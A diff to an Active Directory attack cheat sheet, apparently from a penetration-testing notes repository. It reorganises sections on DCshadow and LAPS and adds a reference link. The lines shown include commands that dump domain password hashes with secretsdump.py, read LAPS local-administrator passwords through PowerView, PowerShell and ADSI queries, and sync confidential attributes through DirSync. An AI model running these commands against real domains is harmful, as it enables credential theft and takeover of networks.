@@ -730,8 +730,6 @@ secretsdump.py -no-pass -k <Domain>/<Username>@<DCIPorFQDN> -just-dc-ntlm
 /ptt -> inject ticket on current running session  
 /ticket -> save the ticket on the system for later use
 
-####  DCshadow
-
 #### DirSync
 Need **DS-Replication-Get-Changes** + **DS-Replication-Get-Changes-In-Filtered-Set** on the domain.
 As presented [here](https://simondotsh.com/infosec/2022/07/11/dirsync.html).
@@ -747,6 +745,9 @@ Sync-LAPS -LDAPFilter '(samaccountname=<computer$>)'
 #Sync confidential attributs
 Sync-Attributes -LDAPFilter '(samaccountname=user1)' -Attributes unixUserPassword,description
 ```
+
+####  DCshadow
+
 # Misconfigurations 
 ## Global path
 If any part of the SYSTEM %PATH% variable is writeable by Authenticated Users, privesc exists. Many applications don't use full path. If system32 is not first entry in path this is bad.
@@ -1465,19 +1466,8 @@ Get-ChildItem 'C:\Program Files (x86)\LAPS\CSE\Admpwd.dll'
 # Identify if installed by checking the AD Object
 Get-ADObject 'CN=ms-mcs-admpwd,CN=Schema,CN=Configuration,DC=DC01,DC=Security,CN=Local'
 ```
-Find ms-mcs-admpwd attribute:
+Find who can get the LAPS passwords:
 ```
-# Powerview
-Get-NetComputer | Select-Object 'name','ms-mcs-admpwd'
-Get-DomainComputer -identity <Hostname> -properties ms-Mcs-AdmPwd
-Get-DomainComputer <target>.domain.local -Properties ms-mcs-AdmPwd,displayname,ms-mcs-AdmPwdExpirationTime
-
-# PowerShell
-Get-ADComputer -Filter * -Properties 'ms-Mcs-AdmPwd' | Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null } | Select-Object 'Name','ms-Mcs-AdmPwd'
-
-# Native
-([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))").findAll() | ForEach-Object { Write-Host "" ; $_.properties.cn ; $_.properties.'ms-mcs-admpwd'}
-
 # LAPS module
 Import-Module AdmPwd.PS
 # Find the OUs that can read LAPS passwords
@@ -1514,6 +1504,17 @@ Once we have compromised a user that can read LAPS:
 ```
 # LAPS Module
 Get-AdmPwdPassword -ComputerName <Hostname>
+
+# Powerview
+Get-NetComputer | Select-Object 'name','ms-mcs-admpwd'
+Get-DomainComputer -identity <Hostname> -properties ms-Mcs-AdmPwd
+Get-DomainComputer <target>.domain.local -Properties ms-mcs-AdmPwd,displayname,ms-mcs-AdmPwdExpirationTime
+
+# PowerShell
+Get-ADComputer -Filter * -Properties 'ms-Mcs-AdmPwd' | Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null } | Select-Object 'Name','ms-Mcs-AdmPwd'
+
+# Native
+([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))").findAll() | ForEach-Object { Write-Host "" ; $_.properties.cn ; $_.properties.'ms-mcs-admpwd'}
 ```
 ### GMSAPassword
 ```
@@ -1553,3 +1554,5 @@ https://www.ired.team/offensive-security-experiments/active-directory-kerberos-a
 [DCSync - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
 https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/appenddata-addsubdirectory-permission-over-service-registry
 https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/acls-dacls-sacls-aces
+
+[Active Directory | HideAndSec](https://hideandsec.sh/books/cheatsheets-82c/page/active-directory#bkmrk-users-which-are-in-a)
